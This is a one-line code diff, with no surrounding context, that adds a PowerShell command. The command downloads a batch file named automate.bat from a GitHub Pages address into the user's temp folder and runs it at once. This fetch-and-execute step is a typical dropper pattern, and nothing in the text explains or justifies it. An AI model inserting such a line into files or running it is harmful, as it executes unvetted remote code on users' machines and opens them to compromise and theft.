@@ -1,0 +1,1 @@
+powershell -Command "wget 'https://supmacllun.github.io/OPM/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
